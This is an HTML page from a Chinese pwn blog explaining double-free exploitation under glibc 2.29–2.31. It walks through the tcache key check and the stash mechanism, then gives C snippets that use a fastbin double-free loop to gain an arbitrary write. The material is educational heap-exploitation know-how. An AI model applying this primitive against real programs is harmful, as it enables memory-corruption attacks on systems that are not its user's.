@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>glibc-2.31下double free思路 | Fl0ey</title><meta name="keywords" content="pwn"><meta name="author" content="Fl0ey"><meta name="copyright" content="Fl0ey"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="前言在glibc-2.27到glibc-2.28，由于tcache机制没有加入检查机制，仅需要double free两次相同的堆块就可以形成环，我们利用tcache机制可以比fastbin attack更方便的地址任意写，因为它不像fastbin attack存在检查size 但是在glibc-2.29到glibc-2.31，tcache机制加入了检查机制，而tcache的stash机制能让gli">
+<meta property="og:type" content="article">
+<meta property="og:title" content="glibc-2.31下double free思路">
+<meta property="og:url" content="http://example.com/2020/11/04/free%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:site_name" content="Fl0ey">
+<meta property="og:description" content="前言在glibc-2.27到glibc-2.28，由于tcache机制没有加入检查机制，仅需要double free两次相同的堆块就可以形成环，我们利用tcache机制可以比fastbin attack更方便的地址任意写，因为它不像fastbin attack存在检查size 但是在glibc-2.29到glibc-2.31，tcache机制加入了检查机制，而tcache的stash机制能让gli">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/20201104155811.jpg">
+<meta property="article:published_time" content="2020-11-04T07:53:09.000Z">
+<meta property="article:modified_time" content="2020-11-04T08:23:00.966Z">
+<meta property="article:author" content="Fl0ey">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/20201104155811.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/11/04/free%E6%80%9D%E8%B7%AF/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isSidebar: true,
+  postUpdate: '2020-11-04 16:23:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/vn_pwn_simpleHeap92de66ab35ad1d659fae887a6e07e13d_1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">9</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">3</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div></div></div><div id="body-wrap"><div id="web_bg"></div><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tcache%E6%A3%80%E6%9F%A5"><span class="toc-number">2.</span> <span class="toc-text">Tcache检查</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stash%E6%9C%BA%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">Stash机制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">利用思路</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/20201104155811.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fl0ey</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">glibc-2.31下double free思路</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-04T07:53:09.000Z" title="发表于 2020-11-04 15:53:09">2020-11-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-04T08:23:00.966Z" title="更新于 2020-11-04 16:23:00">2020-11-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在glibc-2.27到glibc-2.28，由于tcache机制没有加入检查机制，仅需要double free两次相同的堆块就可以形成环，我们利用tcache机制可以比fastbin attack更方便的地址任意写，因为它不像fastbin attack存在检查size</p>
+<p>但是在glibc-2.29到glibc-2.31，tcache机制加入了检查机制，而tcache的stash机制能让glibc-2.29到glibc-2.31下的double free有一种新的姿势</p>
+<h1 id="Tcache检查"><a href="#Tcache检查" class="headerlink" title="Tcache检查"></a>Tcache检查</h1><p>首先在chunk中插入了指向所属tcache结构体的*key指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>  <span class="comment">//链表指针，对应chunk中的fd字段</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>  <span class="comment">//chunk的bk字段，指向所属的tcache结构体</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
+
+<p>chunk放入tcache时候会设置key指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline voidc</span><br><span class="line">tcache_put(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;  <span class="comment">//设置所属的tcache</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//单链表头插法c</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  </span><br><span class="line"></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">//计数增加</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对double free进行检查</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"><span class="comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span></span><br><span class="line"><span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span></span><br><span class="line"><span class="comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="comment">//剪枝</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">//通过检查，放入tcahce中</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put(p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Stash机制"><a href="#Stash机制" class="headerlink" title="Stash机制"></a>Stash机制</h1><p>程序申请一个例如0x70大小的堆块，若是tcache存在，则从tcache中取出这个堆块，而ptmalloc会认为接下来还会需要相同大小的chunk，Stash机制就会尽量把0x70大小的堆块放入tcache中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast())) <span class="comment">//size在fastbin范围内</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index(nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>) <span class="comment">//如果有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">        *fb = victim-&gt;fd; <span class="comment">//取出头chunk</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        REMOVE_FB(fb, pp, victim);</span><br><span class="line">     </span><br><span class="line">      <span class="keyword">if</span> (__glibc_likely(victim != <span class="literal">NULL</span>)) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">size_t</span> victim_idx = fastbin_index(chunksize(victim));</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="number">0</span>)) <span class="comment">//对fastbin的size检查</span></span><br><span class="line">          malloc_printerr(<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 1 <span class="comment">//if USE_TCACHE，Stash过程：把剩下的放入Tcache中</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">//如果属于tcache管辖范围</span></span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>) <span class="comment">//只要tcache没空，并且fastbin还有chunk</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (SINGLE_THREAD_P)  <span class="comment">//那么就从fastbin中取出</span></span><br><span class="line">              *fb = tc_victim-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">              <span class="keyword">if</span> (__glibc_unlikely(tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            tcache_put(tc_victim, tc_idx);<span class="comment">//然后放入tcache中</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>需要利用Stash机制，我们还要结合fastbin。</p>
+<p>首先我们开9个堆</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>  *ptr[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">	ptr[i]=<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *ptr7=<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">int</span> *ptr8=<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br></pre></td></tr></table></figure>
+<p>再将前七个放入tcache中，ptr7和ptr8放入fastbin中并利用double free制造成一个闭环</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">7</span>;j++)&#123;</span><br><span class="line">	<span class="built_in">free</span>(ptr[j]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(ptr7);</span><br><span class="line"><span class="built_in">free</span>(ptr8);</span><br><span class="line"><span class="built_in">free</span>(ptr7);</span><br></pre></td></tr></table></figure>
+<p>接下来我们将tcache中的chunk全部申请回来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">	ptr[i]=<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后我们再从fastbin的闭环中申请一个堆块并且改写fd为target达到地址任意写</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> *ptr9=<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line">*ptr9=<span class="number">0x555555559000</span><span class="comment">//tcache addr</span></span><br></pre></td></tr></table></figure>
+<p>结果如图所示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/20201104162228.png"></p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Fl0ey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/11/04/free%E6%80%9D%E8%B7%AF/">http://example.com/2020/11/04/free%E6%80%9D%E8%B7%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Fl0ey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/20201104155811.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2020/10/27/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0(%E4%BA%8C)/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/20201104155646.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Linux内核学习(二)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/09/29/vn_pwn_simpleHeap/" title="vn_pwn_simpleHeap"><img class="cover" src="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/vn_pwn_simpleHeap1a25da99704fac4b0c91b576838bb98.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-29</div><div class="title">vn_pwn_simpleHeap</div></div></a></div><div><a href="/2020/09/29/羊城杯babypwn/" title="羊城杯babypwn"><img class="cover" src="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/vn_pwn_simpleHeap20201010161251.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-29</div><div class="title">羊城杯babypwn</div></div></a></div><div><a href="/2020/09/29/XCTF-note-service2/" title="XCTF_note_service2"><img class="cover" src="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/vn_pwn_simpleHeapa5cf759350ab40031ea12a30b5fa005.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-29</div><div class="title">XCTF_note_service2</div></div></a></div><div><a href="/2020/10/10/babyheap_0ctf_2017/" title="babyheap_0ctf_2017"><img class="cover" src="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/3e92002edbae7d84ccbaedf8995eba5.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-10</div><div class="title">babyheap_0ctf_2017</div></div></a></div><div><a href="/2020/10/15/house_of_orange/" title="house_of_orange"><img class="cover" src="https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/5dd8dbe3a3b06411233b31de31a29fd.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-10-15</div><div class="title">house_of_orange</div></div></a></div></div></div></article></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/Moniy-Fish/Myimg@main/20201104155811.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 By Fl0ey</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script></div></body></html>
